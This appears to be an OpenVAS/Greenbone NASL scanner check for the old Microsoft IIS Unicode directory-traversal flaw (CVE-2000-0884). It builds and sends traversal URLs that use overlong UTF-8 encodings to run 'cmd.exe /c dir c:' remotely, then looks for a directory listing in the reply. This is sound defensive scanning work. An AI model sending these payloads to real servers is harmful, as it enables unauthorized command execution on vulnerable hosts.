# SPDX-FileCopyrightText: 2009 Christian Eric Edjenguele
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.101014");
  script_version("2024-04-17T05:05:27+0000");
  script_tag(name:"last_modification", value:"2024-04-17 05:05:27 +0000 (Wed, 17 Apr 2024)");
  script_tag(name:"creation_date", value:"2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0884");
  script_name("Microsoft IIS Directory Traversal Vulnerability (MS00-078) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Christian Eric Edjenguele");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-078");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1806");

  script_tag(name:"summary", value:"Microsoft IIS is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"This vulnerability could potentially allow a visitor to a web
  site to take a wide range of destructive actions against it, including running programs on it.");

  script_tag(name:"affected", value:"Microsoft IIS 4.0 and 5.0 is known to be affected.");

  script_tag(name:"solution", value:"There is not a new patch for this vulnerability. Instead, it is
  eliminated by the patch that accompanied Microsoft Security Bulletin MS00-057. Please see the
  references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  # nb: Response check doesn't look that reliable these days...
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

# remote command to run
r_cmd = "/winnt/system32/cmd.exe?/c+dir+c:";

d = make_list("/scripts/",
              "/msadc/",
              "/iisadmpwd/",
              "/_vti_bin/",
              "/_mem_bin/",
              "/exchange/",
              "/pbserver/",
              "/rpc/",
              "/cgi-bin/",
              "/");

uc = make_list("%c0%af",
               "%c0%9v",
               "%c1%c1",
               "%c0%qf",
               "%c1%8s",
               "%c1%9c",
               "%c1%pc",
               "%c1%1c",
               "%c0%2f",
               "%e0%80%af");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

foreach webdir( d ) {

  foreach uni_code( uc ) {

    url = strcat( webdir , ".." , uni_code , ".." , uni_code , ".." , uni_code , ".." , uni_code , ".." , uni_code , ".." , r_cmd );

    qry = string( "/" + url );

    req = http_get( item:qry, port:port );
    reply = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
    if( reply ) {

      header_server = egrep( pattern:"Server", string:reply, icase:TRUE );
      if( ( "Microsoft-IIS" >< header_server ) && ( egrep( pattern:"^HTTP/1\.[01] 200", string:reply ) ) &&
          ( ( "<dir>" >< reply ) || "directory of" >< reply ) ) {
        report = string( "Exploit String", url ," for vulnerability:\n", reply );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
